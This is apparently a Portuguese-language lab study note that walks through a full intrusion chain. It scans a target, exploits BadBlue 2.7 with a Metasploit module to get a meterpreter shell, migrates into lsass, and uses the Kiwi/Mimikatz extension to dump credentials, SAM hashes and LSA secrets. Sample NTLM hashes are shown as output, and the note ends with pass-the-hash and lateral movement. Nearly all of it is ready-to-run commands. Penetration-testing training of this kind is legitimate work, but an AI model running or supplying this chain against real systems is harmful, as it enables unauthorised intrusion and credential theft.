# Dumping Credentials with Meterpreter Kiwi

## Visão Geral

O **Kiwi** é uma extensão do Meterpreter baseada no Mimikatz que permite extrair:

- NTLM hashes
    
- senhas em texto claro
    
- credenciais SAM
    
- LSA secrets
    
- syskey
    

Usado após obter **meterpreter shell**.

---

## Passo 1 — Scan Inicial

```bash
ping -c 4 target
```

---

## Passo 2 — Enumerar Portas

```bash
nmap target
```

---

## Passo 3 — Identificar Serviço

```bash
nmap -sV -p 80 target
```

Exemplo:

```text
BadBlue 2.7
```

---

## Passo 4 — Buscar Exploit

```bash
searchsploit badblue 2.7
```

---

## Passo 5 — Explorar com Metasploit

```bash
msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS target
exploit
```

Resultado:

- meterpreter shell
    

---

## Passo 6 — Migrar para lsass

```bash
migrate -N lsass.exe
```

Necessário para acessar credenciais.

---

## Passo 7 — Carregar Kiwi

```bash
load kiwi
```

---

## Passo 8 — Dump Credenciais

```bash
creds_all
```

Exemplo:

```text
Administrator NTLM: e3c61a68f1b89ee6c8ba9507378dc88d
```

---

## Passo 9 — Dump SAM

```bash
lsa_dump_sam
```

Exemplo:

```text
student NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b
```

---

## Passo 10 — Dump LSA Secrets

```bash
lsa_dump_secrets
```

Exemplo:

```text
Syskey: 377af0de68bdc918d22c57a263d38326
```

---

## Comandos Kiwi Importantes

```bash
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
```

---

## Fluxo de Exploração

1. Exploit aplicação
    
2. Obter meterpreter
    
3. Migrar para lsass
    
4. load kiwi
    
5. dump hashes
    
6. lateral movement
    

---

## Tipos de Credenciais Obtidas

- NTLM hashes
    
- senhas
    
- syskey
    
- credenciais serviço
    
- credenciais domínio
    

---

## Uso dos Hashes

Após dump:

- Pass-the-Hash
    
- PsExec
    
- WinRM
    
- RDP
    

---

## Resumo

Kiwi permite extrair credenciais diretamente da memória via Meterpreter.  
Muito útil após exploração inicial para coletar hashes e realizar **lateral movement**.

---